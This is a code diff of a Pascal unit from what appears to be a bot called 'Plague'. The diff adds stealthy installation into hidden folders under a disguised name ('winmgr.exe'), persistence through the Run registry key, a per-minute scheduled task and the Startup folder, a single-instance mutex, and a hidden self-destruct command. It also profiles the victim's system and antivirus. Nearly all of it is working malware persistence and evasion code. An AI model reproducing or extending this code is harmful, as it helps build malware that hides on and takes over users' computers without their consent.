@@ -6,7 +6,7 @@ interface
 
 uses
   Classes, Windows, Registry, SysUtils, ActiveX, ComObj,
-  Variants, StrUtils, INIFiles;
+  Variants, StrUtils, INIFiles, Process;
 
 function GetGUID: String;
 procedure AnalyzeSystem;
@@ -19,20 +19,30 @@ procedure ScheduleTask(ATaskName, AFileName, AInterval: String);
 procedure DeleteTask(ATaskName: String);
 function Adler32(Str: String): LongWord;
 procedure ToggleCrypt(var MS: TMemoryStream; Key: Word);
+function TaskExists(ATaskName: String): Boolean;
+procedure Reg_RemoveFromStartup;
+function StartupFolder: String;
+function ChDel(FileName: String): Boolean;
+procedure Selfdestruct;
+procedure MutexMagic;
 
 var
   Nick, OS, ComputerName, UserName, CPU, GPU: String;
   AVName, AVState: String;
-  Base, FileName, FullName, Server, ID: String;
+  Base, InternalName, FileName, FullName, Server, ID: String;
   Discriminator: LongWord;
   Delay: LongInt;
 
+  Mutex: THandle;
+
+  MSet: TMemoryStream;
   Settings: TMemINIFile;
 
 implementation
 
 const
   MOD_ADLER = 65521;
+  ERROR_ALREADY_EXIST = 183;
 
 var
   Reg: TRegistry;
@@ -46,22 +56,123 @@ Begin
   Delay:=Settings.ReadInteger('General', 'Delay', 5000);
   FullName:=ParamStr(0);
   FileName:=ExtractFileName(FullName);
-  Base:=SysUtils.GetEnvironmentVariable(Settings.ReadString('Install', 'BaseLocation', 'TEMP'));
+  InternalName:=Settings.ReadString('Install', 'InternalName', 'winmgr.exe');
+  Case Settings.ReadString('Install', 'BaseLocation', 'Temporary Directory') of
+    'Temporary Directory': Base:=GetEnvironmentVariable('Temp');
+    'Application Data': Base:=GetEnvironmentVariable('AppData');
+    'Local Application Data': Base:=GetEnvironmentVariable('LocalAppData');
+    'My Documents': Base:=GetEnvironmentVariable('UserProfile')+'\Documents';
+    'Favorites': Base:=GetEnvironmentVariable('UserProfile')+'\Favorites';
+    'Saved Games': Base:=GetEnvironmentVariable('UserProfile')+'\Saved Games';
+  end;
   Base:=IncludeTrailingBackslash(Base) + Settings.ReadString('Install', 'BaseName', 'Plague');
+  if RightStr(Base, 1)='\' then Delete(Base, Length(Base), 1);
+end;
+
+procedure MutexMagic;
+Begin
+  Mutex:=CreateMutex(Nil, True, PChar(Settings.ReadString('General', 'Mutex', 'Plague')));
+  if GetLastError=ERROR_ALREADY_EXIST then Halt(0);
+end;
+
+procedure Selfdestruct;
+var
+  M: TProcess;
+Begin
+  FileSetAttr(Base+'\'+InternalName, faNormal);
+  FileSetAttr(Base, faDirectory);
+  M:=TProcess.Create(Nil);
+  M.Executable:='cmd';
+  M.Parameters.Add('/C timeout 5 & del /F /Q "'+Base+'\*.*" & rmdir "'+Base+'"');
+  M.InheritHandles:=False;
+  M.CurrentDirectory:='C:\';
+  M.ShowWindow:=swoHIDE;
+  M.Execute;
+  M.Free;
+end;
+
+function ChDel(FileName: String): Boolean;
+Begin
+  Result:=True;
+  if FileExists(FileName) then Begin
+    FileSetAttr(FileName, faNormal);
+    Result:=DeleteFile(FileName);
+  end;
+end;
+
+function StartupFolder: String;
+Begin
+  Result:=IncludeTrailingBackslash(GetEnvironmentVariable('AppData'))+'Microsoft\Windows\Start Menu\Programs\Startup';
+end;
+
+function Reg_AddToStartup: Boolean;
+Begin
+  Result:=True;
+  try
+    Reg:=TRegistry.Create(KEY_WRITE OR KEY_WOW64_64KEY);
+    Reg.RootKey:=HKEY_CURRENT_USER;
+    Reg.OpenKey('Software\Microsoft\Windows\CurrentVersion\Run', False);
+    Reg.WriteString('WinManager', Base+'\'+InternalName);
+    Result:=Reg.ValueExists('WinManager');
+    Reg.Free;
+  except
+    Result:=False;
+  end;
+end;
+
+procedure Reg_RemoveFromStartup;
+Begin
+  try
+    Reg:=TRegistry.Create(KEY_WRITE OR KEY_WOW64_64KEY);
+    Reg.RootKey:=HKEY_CURRENT_USER;
+    Reg.OpenKey('Software\Microsoft\Windows\CurrentVersion\Run', False);
+    Reg.DeleteValue('WinManager');
+    Reg.Free;
+  except
+  end;
+end;
+
+function Task_AddToStartup: Boolean;
+Begin
+  ScheduleTask('WinManager', Base+'\'+InternalName, 'MINUTE');
+  Result:=TaskExists('WinManager');
+end;
+
+procedure Auto_AddToStartup;
+var
+  S: String;
+Begin
+  if Not(Task_AddToStartup) then
+  if Not(Reg_AddToStartup) then Begin
+    S:=StartupFolder;
+    if Not(DirectoryExists(S)) then MkDir(S);
+    CopyFile(PChar(FullName), PChar(S+'\'+InternalName), False);
+    FileSetAttr(S+'\'+InternalName, faSysFile{%H-} or faHidden{%H-});
+  end;
 end;
 
 procedure DoFirstRun;
 Begin
   //Install the bot
-  //Establish a base
-  if Not(DirectoryExists(Base)) then MkDir(Base);
-  FileSetAttr(Base, faSysFile{%H-} or faHidden{%H-});
-  CopyFile(PChar(ParamStr(0)), PChar(Base+'\'+FileName), False);
+  if Not(DirectoryExists(Base)) then Begin
+    MkDir(Base);
+    FileSetAttr(Base, faSysFile{%H-} or faHidden{%H-});
+  end;
+  CopyFile(PChar(FullName), PChar(Base+'\'+InternalName), False);
   //Add to StartUp
+  Case Settings.ReadInteger('Install', 'Startup', 3) of
+    1: Reg_AddToStartup;
+    2: Task_AddToStartup;
+    3: Auto_AddToStartup;
+  end;
   //Modify the settings
   Settings.WriteInteger('General', 'FirstRun', 0);
-  UpdateResourceSettings(Base+'\'+FileName);
-  Restart(Base+'\'+FileName);
+  UpdateResourceSettings(Base+'\'+InternalName);
+  FileSetAttr(Base+'\'+InternalName, faSysFile{%H-} or faHidden{%H-});
+  Restart(Base+'\'+InternalName);
+  MSet.Free;
+  Settings.Free;
+  Halt(0);
 end;
 
 function GetGUID: String;
@@ -166,34 +277,75 @@ end;
 procedure LoadSettings;
 var
   Res: TResourceStream;
-  MSet: TMemoryStream;
 Begin
   Res:=TResourceStream.Create(HInstance, 'Settings', RT_RCDATA);
   MSet:=TMemoryStream.Create;
   MSet.LoadFromStream(Res);
   Res.Free;
   Settings:=TMemINIFile.Create(MSet);
-  MSet.Free;
 end;
 
 procedure ReloadSettings;
 Begin
+  MSet.Free;
   Settings.Free;
   LoadSettings;
 end;
 
 procedure ScheduleTask(ATaskName, AFileName, AInterval: String);
-begin
-  ShellExecute(0, nil, 'schtasks', PChar('/create /tn "' + ATaskName + '" ' +
-    '/tr "' + AFileName + '" /sc '+AInterval),
-    nil, SW_HIDE);
+var
+  M: TProcess;
+Begin
+  M:=TProcess.Create(Nil);
+  M.Executable:='schtasks';
+  M.ShowWindow:=swoHIDE;
+  M.Options:=[poWaitOnExit];
+  M.Parameters.Add('/Create');
+  M.Parameters.Add('/TN "'+ATaskName+'"');
+  M.Parameters.Add('/TR "'+AFileName+'"');
+  M.Parameters.Add('/SC "'+AInterval+'"');
+  M.Execute;
+  M.Free;
 end;
 
 procedure DeleteTask(ATaskName: String);
+var
+  M: TProcess;
 Begin
-  ShellExecute(0, nil, 'schtasks', PChar('/delete /f /tn "' + ATaskName + '"'),
-    nil, SW_HIDE);
+  M:=TProcess.Create(Nil);
+  M.Executable:='schtasks';
+  M.ShowWindow:=swoHIDE;
+  M.Options:=[poWaitOnExit];
+  M.Parameters.Add('/Delete');
+  M.Parameters.Add('/F');
+  M.Parameters.Add('/TN "'+ATaskName+'"');
+  M.Execute;
+  M.Free;
 end;
+
+function TaskExists(ATaskName: String): Boolean;
+var
+  M: TProcess;
+  S: TStringList;
+Begin
+  M:=TProcess.Create(Nil);
+  try
+    M.Executable:='schtasks';
+    //M.ShowWindow:=swoHIDE;
+    M.Options:=[poWaitOnExit, poUsePipes, poStderrToOutPut];
+    M.Parameters.Add('/Query');
+    M.Parameters.Add('/FO "LIST"');
+    M.Parameters.Add('/TN "'+ATaskName+'"');
+    M.Execute;
+    S:=TStringList.Create;
+    S.LoadFromStream(M.Output);
+    Result:=(Pos('ERROR:', S.Text)=0);
+    S.Free;
+  except
+    Result:=False;
+  end;
+  M.Free;
+End;
 
 procedure Restart(ExeName: String; RemoveOldCopy: Boolean = False);
 var
@@ -203,7 +355,7 @@ Begin
   ShellExecute(0, nil, PChar(ExeName), PChar(Params), nil, SW_SHOWNORMAL);
 end;
 
-procedure UpdateResourceSettings(ExeName: String);  //This will cause the bot to restart!
+procedure UpdateResourceSettings(ExeName: String);
 var
   Res: THandle;
   Str: TStringList;
